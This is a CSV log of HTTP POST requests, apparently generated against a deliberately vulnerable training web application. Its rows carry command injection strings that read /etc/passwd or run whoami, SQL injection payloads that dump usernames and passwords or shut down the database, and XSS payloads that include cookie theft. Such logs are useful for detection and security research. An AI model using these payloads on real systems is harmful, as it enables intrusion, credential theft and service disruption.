_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
77bfd354-6f37-41d6-a702-9bffb09b21e1,d6fb14f4662b056c47e6978887716467,14753,93.121.62.35,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'afN7pe70'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:48.320232
91dc80f5-3d45-481c-a181-9dc32fc736e9,daa7dc146ded241ce41cdb35835dd4bc,307,95.176.252.21,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3177'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:48.329260
78ace0a6-7bea-49a1-850a-bebf35032c01,cc26f53d80a9f14f151613bb3fcaaa4e,273,149.196.70.88,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9798'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:48.532505
db88ccc4-76fe-40ea-b82d-84bed89def03,e73825dd248790068dcf6628883898f4,14753,165.205.54.63,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'ePZJUQi5'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:48.544727
3db4e07d-457f-42a5-8ff9-ff754f3f9627,94145a219c712ad1c3c460279190a74b,307,58.59.168.165,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4398'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:48.548760
80b944c6-6749-480f-aaa8-6516e383e246,2da1251c88517de82112f5bf20890dcc,273,186.134.235.191,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7018'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:48.774926
d2491cad-aa3d-4171-8658-0107e7d9589f,1b6e9483ba17511a6c9cd0372760ed9e,279,182.67.83.162,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=9i0Ez5qO,200,2025-10-12T01:08:48.788674
015d20f8-fc64-4de1-9999-9b6ccb5db37c,34ee248eadc04b71aaf9e313444f0b44,14753,174.84.47.105,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'ojKYUnsx'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:48.841444
45392ca3-3e62-4011-8038-d0562d4e37a0,f912df3c370a7564a1d9ba865ad5f2ea,367,184.108.218.160,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6889'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:48.844625
689d2875-1a51-4d03-a4e7-4f8bbcaa000d,9f93bab4c1d763ff574a7ba573cef716,14745,113.125.199.28,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:48.906040
1ca8d81f-1c58-4cc8-883b-998eb85aefd0,cb308c5d7e268411a4d5527f0f78136b,307,102.179.142.28,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3956'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:48.954600
0088a805-633d-4f8c-8287-20dbb5c5ffd7,331ac336f972bbccc2a09465985404eb,307,175.88.133.0,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8833'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:49.172721
eb2cdbf7-fc65-4c3e-9985-319d6d906084,cc70097c808841ae1a5bb91be84c4e01,14753,165.79.196.178,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'ZJwfwc0z'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:49.358141
0cbf0ec8-ce9a-4cee-8eb2-5f86f337f860,cdffbaf3beaedf2a449b8609d43b3369,14745,56.30.225.42,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:49.365135
abf0db90-f5e7-44e4-9391-9138fda817b9,b61ce2a13b817fc738a5099677cd22d5,14745,110.16.250.160,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:49.413363
1807cbe0-0dca-427c-9f11-7841e4966a7e,28404f903808fd78542651311d5c3530,14753,150.181.188.130,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'jZgIxTSl'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:49.462216
7fce00c3-caa7-4d58-bf66-12fee5b826fa,e40e46218f25af8782724d8453e17934,273,119.35.3.99,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1345'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:49.469459
36c68b0f-fda9-4c7c-8a36-98c4531c66ac,45977fd1129a1d2a97ec8ddaaebfe5f8,14745,167.36.26.192,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:49.537261
8e5a8aef-b1ef-41e4-a116-6840562861b5,9d7899aa506730306c750ddf57acf23c,307,34.170.20.10,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1598'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:49.587277
02463546-0bbd-4d36-b390-d51485fb1dc4,69dbdd11f8a7214b48d9af70b9d255a0,14753,195.17.235.128,POST,cia/command-injection,HTTP/1.1,"[('_uid', '6nm8mcOT'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:49.837059
6cc5ae7a-2c96-4368-8c49-f62c1c58b13f,791f6f25dcd457446a8a55d59ad8c9e6,14745,52.82.151.195,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:49.845390
11bc0666-d591-4fd6-a279-22a29457ea08,3898a920c32280eb3aac931702016131,273,21.57.197.71,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2036'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:49.892781
54b5f68a-65b4-4889-b457-b1909baa6ee4,4d189be7acb35ef2f7da09944507b797,14753,157.130.197.226,POST,cia/command-injection,HTTP/1.1,"[('_uid', '891FAVpf'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:49.972520
ecba52e3-f489-4975-aca8-9ed0825d03aa,e02a6a23183a51a9caa19f0cb6ff0ce9,14745,129.121.27.199,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:49.976697
b986b98d-9bc6-423a-a0a1-a0dfd5511d51,e164d750a0ec354984fa1499b5c71290,279,111.30.56.224,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=qrthVz7x,200,2025-10-12T01:08:50.031275
5084b7ff-773f-4e0a-af45-c5560531644a,16257048dfafc9f5a5f41b7071f3a47f,14745,105.104.216.27,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:50.101893
b1acaff5-928b-4eb8-9b1f-1456053ed9e9,4abce0595db9b8fe96e3228bc2bda42e,14753,85.249.202.125,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'dmHgNb9j'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:50.150503
03e7326c-3668-4d2c-a1d8-6a04e8580d10,52c7257b725c5d5e5e332bff59468033,279,87.91.213.168,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=vbjfs2rB,200,2025-10-12T01:08:50.156896
cb9eff2f-173d-44cd-9c44-f48a23597b1c,c881e4e4d54d7dfeca853f9e2e800fcc,279,167.106.67.76,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=GYnW9IU6,200,2025-10-12T01:08:50.247303
e5add7ed-f56a-4127-8dc4-b94af4b19d8f,e14e876afd6d77f6fb2f64193a3abe93,307,24.17.100.188,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6972'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:50.259950
2ade1df3-bd66-40c3-b085-8f214ca4907f,d17493f10e2432018baef984e58cfbf9,307,30.165.149.170,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2983'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:50.482127
17e10ce6-e221-422d-abfe-0b2f680a8fdb,a277859c43a1a0c78dd81572ae50ac4b,14753,106.222.131.32,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'pxIDWMwG'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:50.660572
83c0dea5-22f4-4d5f-bfc4-aa6d7f03d6d4,7d72af688516be95742e3ae808b3b683,14753,68.203.105.184,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'KN78KaNl'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:50.668358
32712ac7-182c-459e-bd93-a6d8f6a645bb,e987567586853d52db7560db98f02ce0,273,86.106.101.35,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6796'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:50.673241
fc215749-b3f4-4676-8455-1021d314d0d0,4db1dabf576ea7dbaef8e88baa8b52ea,14745,164.140.248.120,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:50.732115
eb74710a-573a-47d8-b0cb-178e2d50fde6,10c0b6b4bd63ea239b55e05946222d1b,273,140.91.159.90,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3670'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:50.781914
40966687-0072-46bb-ba05-3e89aa501134,a5a3e788e8deb9fa9217a774a721bfd1,14753,204.187.159.115,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'lAK5erww'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:50.838615
154dc6d3-75e6-4f58-98c0-1639856d273e,68e37f8f6deb6467c5f6ec8e794b9f42,14753,91.82.80.22,POST,cia/command-injection,HTTP/1.1,"[('_uid', '1Evmr5ow'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:50.844381
8d41b59d-420f-4b1b-9cf6-423e5f40e1ba,cd5f2a30d4dc0226d745d5df2d93447a,14745,148.157.3.126,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:50.895306
d42aa276-de21-49fc-8805-541d77ea1d81,de418e93abc2830580b2e55ab200b3a3,14753,45.32.194.163,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'sQCVQZgU'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:50.943657
7c132485-0d5e-4034-8887-a9ff004c49ee,44d8decb22bd955d8ee59c2a66c98902,279,149.55.230.240,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=y0v67vpP,200,2025-10-12T01:08:50.954002
d425d4ff-e2df-4740-99bc-609ef9e5f2a6,fe8fc5ed85e4746d44bec3e7aecb8dea,279,165.155.244.130,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=BteWsIyU,200,2025-10-12T01:08:51.023349
43e7c40d-ff67-4ada-9e2d-5811ba3596b4,2a4a4e393c30ae2f74a5db2cd32b63b0,14753,160.77.183.97,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'cWqnRzoC'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:51.075159
35471471-fab6-4db6-96c8-64dcedf6fa24,f60ae56eceece384663cf3bb77d2eae6,14753,12.190.152.135,POST,cia/command-injection,HTTP/1.1,"[('_uid', '4wviOVtD'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:51.080371
13a1d098-9b7b-4523-ac17-2fb2a6f4e6e0,d6f7329f489562dc037b75de4d3fd7ca,273,52.76.128.115,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8453'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:51.088165
0ba64845-b1f3-4bf0-bce2-14f004bbe60e,84c4761c841cb2a623c38924b960fe8d,14745,38.78.191.144,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:51.184961
f66784c4-d1b2-40d1-bdde-2dac40ef95dc,3a55ec9f95b3241c559eb2c2981d7755,14745,17.31.151.246,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:51.242578
4ed51f48-2163-4ae9-a6b8-117d85df4ced,18ec031795f3d96f46386a83e6bc6fba,279,84.7.38.253,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=YChXemgQ,200,2025-10-12T01:08:51.290287
c95244b3-41cf-4a2e-80c5-e7bd111faee2,6c2f084c56e10c7b938c6917c8401fb3,279,14.56.189.175,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=6cHrXtXL,200,2025-10-12T01:08:51.367425
2af74b6b-4a9c-49d9-9d66-338214bb3c12,190d369f2770889de4bc2f66febf8317,279,206.46.177.181,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=RhhIMYQB,200,2025-10-12T01:08:51.421045
80c57a46-5d34-4fc9-bf18-9f94e72181ff,4d681f93de488a6ef14cab85c94d6e62,367,150.188.207.65,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4921'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:51.476085
2f09af2a-190f-4141-8cd8-af272b0ed6cb,61dd35542b869ac55c9f717007f7eb9e,14745,44.23.154.197,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:51.535665
d6b9d407-03b7-4650-90b3-eea880ee959d,c7bb82f22612494767a1c8a3eddc29a2,279,27.99.191.207,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=6CeIubyQ,200,2025-10-12T01:08:51.588317
a97621f0-cc4a-49e2-9bf5-8b9dc5765b8a,5e387fa88d5725c450ecef965527e175,14745,65.193.206.100,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:51.648916
c89e6e84-9d0c-45e1-b504-b7654a445b5a,55b3232304695063112b67c1301e4d93,273,76.159.20.29,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7267'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:51.698805
e97c1016-c3b4-4487-8036-47adcbfe3cbb,f260e1cb03306abe17117520cd82953a,14745,85.220.236.225,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:51.758198
d25834ec-a7bc-4b6b-b167-32e818703bc7,8625c9174e656cda9fd25c95094a03b1,14745,15.126.171.95,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:51.806261
64fe9015-8ec3-4f4b-83a2-8a522c1c98b8,d1ec0490d05cfc6f716b766167c02136,273,49.23.181.234,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1636'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:51.831744
6960badd-ba1b-41d6-b01c-d955bcc54119,cf9634ac9c0124b65735210f9c7ebe96,307,59.113.101.213,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7855'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:51.903893
e5416225-7c3f-4dca-a64e-218b2b8fe993,9241e81faaa9d657e114c8554a007be0,14753,57.65.97.29,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'HJ7xZtXt'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:52.133436
050edc07-98ce-4596-ba02-dc8276a0644a,3bd29ada0830e024e74bd38dcf953734,14753,88.157.234.21,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'oSdEuuSI'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:52.137787
f845690a-d635-499d-bece-fa5f4fc87fec,3832a5daecc325d00657789bbaf2c1f8,273,135.125.96.135,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7489'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:52.144660
8fe9a813-3a3a-4cd7-9270-6f84c3804105,53f877a491b41f7602334f7e45f5e6a4,14745,206.90.208.49,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:52.204837
acc1cee8-9415-40ca-ac83-6be7fc4b821b,5f624a5343fc04cb2926a111b5225bb7,14745,164.106.15.241,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:52.252446
229fd202-4f09-4195-a380-e68c8f865644,ec2cdb1a6380a037faf7456a901ae7b5,273,154.57.193.64,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3055'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:52.301576
503f8291-ffe3-4801-a01d-27cb61fbda78,0b97c5dd97e5dfd7c41d0b82a1c54bfe,14753,103.168.167.190,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'mZ2v9RKH'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:52.376054
d13d2883-52cc-4cf9-9be1-0f56c886f9c9,1a588c9b58ef90cd0bb15b0718ec6df2,14753,220.133.93.158,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'pjHc98xV'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:52.385200
828fea11-df20-4a57-9811-a9882197a561,2ce336a803b72d86d11a78b603cc9989,14745,199.125.158.40,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:52.392745
29ac137f-2697-4266-aa99-3f495182e6a2,89451d1e3456e98546e0dc144b941d58,14745,40.28.186.46,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:52.438495
a638f8f8-f736-450e-ad50-04faf486ba34,28c588a0a00dcc658fe9ae435843e84e,279,106.58.254.59,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=8eijFuAE,200,2025-10-12T01:08:52.492636
d83484b4-944e-46e0-b74e-6e2281f49fc3,0a0b657b5b886c3d8c4ebfb209b7be16,279,200.133.242.77,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=5PbSyRGf,200,2025-10-12T01:08:52.548752
b429d355-01ad-4484-af01-c7292e04d386,99a716f43b4baff89bb24576fe2a794a,367,96.39.185.111,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1726'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:52.602644
43d61d0c-a45f-4808-9480-6f6892066c79,e8000ce477359b2fafe17b7d48a4e810,14753,116.91.231.18,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'luZxrEds'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:52.661474
d55fb525-0a5a-4c21-8449-b6ead106ead6,d6edfb46852eed3a60b073cfe59727ac,14753,150.74.32.230,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'goubRj2P'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:52.668012
13abb43e-2008-452d-9a5a-0ea0523e0f02,a34f912b1dcf1346a92e3710e64d92a9,307,179.123.86.37,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5836'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:52.677231
5c91e348-18b8-44a5-bdb7-c9151f570ea4,f6e4650d1902e3f9270ba253f46aecc5,14753,62.146.211.148,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'PtKCOIb6'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:52.879671
4abd6ee3-a580-4460-96d5-f26ee57b044e,f11c1c290c7bd494e9352dd246309bca,279,178.45.9.199,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=VsCXlNCA,200,2025-10-12T01:08:52.887094
5b52ea22-f4c7-47c5-9a95-968afcc4c89c,292929de7cfa0b55070a5796d1fae91c,273,144.18.154.150,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7055'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:52.942581
2b8dcb2a-54e9-4050-aed6-e1c888ce9cf1,c1ffaf45a6d13232a373b644c7e29f2b,14753,93.254.250.147,POST,cia/command-injection,HTTP/1.1,"[('_uid', '0xyjhIMi'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:53.002466
a1a6273d-16c1-44c1-96df-2c89c334b436,f19a649ac7b4dd044457723b94f71dde,367,107.106.190.241,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1940'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:53.009327
852af95f-7b41-4a21-aa91-7379af7d8fb4,2052bec48a73dc87cd53a26f9c79f6bd,14753,177.6.201.66,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'fDkBXmG1'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:53.060460
1e8c0b2b-f884-44f7-8d84-3793b52d85d1,72196ea7245cb7afc30a42307a5a1c39,14753,202.244.38.232,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'lzQlChZC'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:53.066187
e7b26c29-d8f5-454c-a691-502a5d14b66c,769f3442faa1840fb1ced43be366f19e,14753,104.101.167.195,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'TO34zu0K'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:53.113817
9cee20d9-33f7-40d9-b2cd-17ff15e682b0,c3893882d0366f39d250e2a76ed346ac,14753,106.97.215.54,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'FLTRAu6A'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:53.119650
9af59b0c-83c9-4c13-b867-a24be79cce31,7d1af4f062efb7f9eb956af9adfad8d6,14745,93.217.204.150,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.127885
df9d9c34-cec0-4767-b5cc-ea3b1b9a0ce1,6ef5a135ec525fafbe9a2a522b99ff1d,279,141.55.117.244,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=CWeg0aTS,200,2025-10-12T01:08:53.178565
c7b0ec72-4db7-4cc4-84ca-24f088d968b3,b48d8122e0ef647689779397201effde,273,21.114.165.93,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9550'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:53.246584
a604d043-aaf8-4055-bc17-3f4330e3b331,4eae98b7b7dac9c6fb7ea2bfe9dd6671,14745,99.144.149.156,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.305685
ddc1c17a-2dc3-45c4-ae49-b9143619603e,9427def3ed009db6639330a32ff8db76,273,63.249.90.65,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6853'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:53.354977
d558ee0a-f441-4481-936c-2a372164034e,fc6ed247d5d28900cddd6e4a9efca7a2,14745,10.177.8.149,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.418732
11f2d856-a1a6-4a59-97e9-295d934ebebf,fba1cfbc00b7a7f7564adfa74623f79f,14753,56.31.211.171,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'f5Bo8ckS'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:53.466885
c6a2473c-484a-4f30-99a8-2fcd454563fa,b15d36576e8c27e9dd8dcff0e75fff0d,279,51.101.58.70,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=NXv5RFyw,200,2025-10-12T01:08:53.469933
c7468012-92c0-437e-aa59-e1914f73b8c1,90b46a1aea64c19ac543ccaa7450a5e4,14745,17.236.12.97,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.524591
72118a5c-b1ca-47c4-95ab-f407f4e87c02,715d51ac73a63bdf2940b3ce0c1f0079,367,212.199.63.252,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9328'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:53.574485
464d66c8-3371-4c8a-aeb0-1c13874e90ca,ee1a91b619b582933dca58ebc7307da5,14745,211.51.8.99,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.629861
261164d1-0736-424f-80b9-f501b8133983,abf0fca47e9759b36bc8c1c6f2ae72f8,14745,187.116.120.47,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.678280
b49e480d-82c0-41c8-a68c-825ba3176bd0,5429af0d4e3755e198a9ce7944a6534b,14745,76.18.58.139,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.729052
2ea49270-049c-45b9-82dc-57c602fbe7b3,4f09babb89fb99a148d909669fcd6dc8,279,45.174.124.107,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=7bJQiYJ5,200,2025-10-12T01:08:53.779032
708e9908-57ff-45c2-b726-d3d8a64e732a,1a4cf06f7d0c8fb4dd14be577f3fc4e8,14745,178.129.162.223,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:53.836818
06721902-71a9-4311-ad73-19cabe6b345d,2b9f7f18cd93bf8479e78bf60d18804e,14753,172.29.169.125,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'kG8ZW9NJ'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:53.884384
fbdc419d-f797-497b-83ac-888b4da3733e,d2cfc158abb69f74013764be2c47de10,307,122.56.72.212,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5103'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:53.891810
d84dec63-2ece-4111-8621-dba1f185275b,3ef2ebf4c66dfd9d7432e378e650175a,14745,198.0.56.83,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:54.108292
faab717d-9b4b-4f2d-b316-898a787c22b6,dcf3b890e2a1b05b2780e679750689b7,14745,46.4.119.146,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:54.115648
2a44463f-094b-4382-8650-9629dac500ed,69a3489ce54e6bb392e06768a693ce65,14745,24.227.146.48,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:54.161846
ecfe6c29-d4ea-460d-872b-308b154ed5b4,eacd795dc1ff5bca0ea43935fba6f5d6,279,49.243.221.142,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=9Huqvrx5,200,2025-10-12T01:08:54.214509
951b7fe3-01bd-4ea8-8380-2aecc1ab8ba4,7ec766d714f80179c99dac0192cfa196,14745,113.167.119.104,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:54.285783
3adee12c-89b2-459d-8858-fcbae7e58bc2,e4dd2fefaff6db0d4138e850ef1ce52a,14753,40.73.6.31,POST,cia/command-injection,HTTP/1.1,"[('_uid', 's1uSJnZf'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:54.335791
75393752-a817-482c-a2f3-6a4db3cfdaeb,7c5df1db6b8a09bafb93b346fae5c0b3,279,175.198.66.86,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=jNt1ouCy,200,2025-10-12T01:08:54.340294
